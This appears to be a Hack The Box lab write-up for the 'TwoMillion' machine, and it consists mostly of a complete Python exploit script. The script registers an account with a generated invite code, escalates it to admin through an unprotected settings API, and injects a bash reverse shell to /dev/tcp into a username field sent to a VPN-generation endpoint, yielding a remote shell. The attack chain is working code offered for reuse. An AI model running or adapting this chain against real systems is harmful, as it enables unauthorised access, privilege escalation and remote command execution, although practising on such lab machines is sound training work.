---
title: TwoMillion Foothold
date: 2023-07-19 12:00:00 pm
categories: [HTB]
tags: [HTB, Linux, Easy, Python Scripting, Web API]

img_path: /assets/img/htb/writeups/twomillion
---

# Python Script

* * *

With the script you gain www-data access to machine:

```python
#!/usr/bin/env python3

"""
TwoMillion Foothold
-------------------
Author: Marss
Date: 19 July, 2023
"""

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from base64 import b64decode
from json import loads
from random import choice
from requests import Session, Request
from string import ascii_letters
from signal import signal, SIGINT

# debugging
import pdb

# Ctrl + c
# (function)
def signal_handler(signum, frame):
	exit('\n[!] User terminated.')

# (signal)
signal(SIGINT, signal_handler)

# Main class
class Exploit:
	
	def __init__(self, args):
		self.args = args

		self.target_host = {
			'ip_addres':'10.10.11.221',
			'domain_url':'2million.htb'
		}

		self.session = Session()
		
		# set proxies
		#self.proxies = {'http': 'http://127.1:8080'}
		#self.session.proxies.update(self.proxies)

	def run(self):
		try:
			invite_code = self.generate_code()

			random_user = self.get_random_string(5)
			username = self.register(invite_code, random_user)
			self.login(username)

			self.set_admin_perm(username)
			print(f'[*] Open port {self.args.port} to receive the shell.')
			input(f'[*] Press ENTER to continue.')
			self.reverse_shell()

		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def b64_decode(self, encoded_data: str) -> str:

		b64_bytes = encoded_data.encode('ascii')
		cont_bytes = b64decode(b64_bytes)
		decoded_data = cont_bytes.decode('ascii')

		return decoded_data

	def generate_code(self)-> str:

		req = Request('POST', 'http://' + self.target_host['domain_url'] + '/api/v1/invite/generate')
		prepare_req = self.session.prepare_request(req)

		response = self.session.send(prepare_req)
		b64_code = loads(response.text)['data']['code']

		return self.b64_decode(b64_code)

	def get_random_string(self, length: int) -> str:
		return ''.join(choice(ascii_letters) for i in range(length))

	def register(self, invite_code: str, user: str) -> str:

		post_data = {
			'code': f'{invite_code}',
			'username': f'{user}',
			'email': f'{user}@2million.htb',
			'password': f'{user}',
			'password_confirmation': f'{user}'
		}

		req = Request('POST', 'http://' + self.target_host['domain_url'] + '/api/v1/user/register',
			data=post_data)
		prepare_req = self.session.prepare_request(req)
		self.session.send(prepare_req)
		
		return user

	def login(self, user: str) -> str:

		post_data = {
			'email': f'{user}@2million.htb',
			'password': f'{user}'
		}

		req = Request('POST', 'http://' + self.target_host['domain_url'] + '/api/v1/user/login',
			data=post_data)
		prepare_req = self.session.prepare_request(req)
		self.session.send(prepare_req)

	def set_admin_perm(self, user: str) -> str:

		post_data = {
			'email': f'{user}@2million.htb',
			'is_admin': 1
		}

		req = Request('PUT', 'http://' + self.target_host['domain_url'] + '/api/v1/admin/settings/update',
			json=post_data)
		prepare_req = self.session.prepare_request(req)
		self.session.send(prepare_req)

	def reverse_shell(self):

		bash_shell = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(self.args.ip, self.args.port)
		post_data = {
			'username': f';{bash_shell};'
		}

		req = Request('POST', 'http://' + self.target_host['domain_url'] + '/api/v1/admin/vpn/generate',
			json=post_data)
		prepare_req = self.session.prepare_request(req)
		self.session.send(prepare_req)

# Main flow
if __name__ == '__main__':

	ascii_title="""|Two Million HTB|"""

	parser = ArgumentParser(
		formatter_class=RawDescriptionHelpFormatter,
		epilog="Example:\n\npython3 foothold.py -i 10.10.10.10 -p 4444")

	parser.add_argument('-i', '--ip', type=str, required=True, help='Specified IP to receive the shell')
	parser.add_argument('-p', '--port', type=str, required=True, help='Specified PORT to receive the shell')

	args = parser.parse_args()

	print(ascii_title)

	exploit = Exploit(args)
	exploit.run()
```

## PoC

* * *

![PoC](PoC.png){: .shadow}

> Puedes encontrar el script y sus requerimientos en mi repositorio: [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tool_TwoMillion)
{: .prompt-info}